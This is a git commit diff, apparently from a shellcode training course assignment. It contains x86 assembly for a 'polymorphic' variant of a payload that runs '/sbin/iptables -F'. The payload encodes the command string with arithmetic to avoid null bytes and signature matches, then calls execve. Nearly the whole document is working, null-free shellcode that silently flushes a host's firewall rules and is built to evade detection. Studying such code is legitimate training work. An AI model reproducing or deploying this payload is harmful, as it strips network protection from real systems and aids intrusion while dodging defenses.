7a5f7556a89e7d45e4ae836e99eff2d7e12a5e27
Simon Lemire <lemire.simon@gmail.com>
2018-12-11 21:51:00 -0500

    Completed 2nd poly shellcode for assignment 6

--- assignment6/iptables_poly.asm
+++ assignment6/iptables_poly.asm
@@ -3,18 +3,32 @@ section .text
 global _start
 
 _start:
-	push 0x5a462d5a			; //sbin//iptablesZ-FZ
-	push 0x73656c62
-	push 0x61747069
-	push 0x2f2f6e69
-	push 0x62732f2f
-	mov esi, esp
+	mov eax, 0x2d5a5a46		; 0x5a462d5a (shifted 16 bits)
+	ror eax, 0x10
+	push eax
+	add eax, 0x191f3f08
+	push eax
+	sub eax, 0x11f0fbf9
+	push eax
+	sub eax, 0x32450202
+	add eax, 0x2			; avoid null-byte
+	push eax
+	add eax, 0x3343c0c6
+	push eax
+
+	mov esi, esp			; esi -> "//sbin//iptablesZ-FZ" 
+	mov ebx, esi			; const char *filename
 	cdq						; edx = 0
 	mov eax, edx			; eax = 0
-	mov byte [esi+16], dl	; null Z: //sbin//iptablesZ
-	mov byte [esi+19], dl   ; null Z: -FZ
-	mov al, 0x0b			; sys_execve
-	mov	ebx, esi			; const char *filename
-	mov [esi+20], ebx
-	lea ecx, [esi+20]  		; char *const argv[]
+	mov byte [esi+16], dl	; null out Z byte: //sbin//iptablesZ -> "//sbin//iptables"
+	mov byte [esi+19], dl   ; null out Z byte: -FZ -> "-F"
+	push edx				; null-terminatation for argv
+	lea eax, [esi+17]		; char *const argv[1] -> "-F"
+	push eax				; 
+	push esi				; char *const argv[0] -> "//sbin//iptables"
+	mov ecx, esp			; char *const argv[] -> "//sbin//iptables", "-F"
+	push edx				; NULL byte for envp[]
+	mov eax, edx			; eax = 0
+	mov edx, esp			; char *const envp[] -> NULL
+	add eax, 0xb			; sys_execve
 	int	0x80
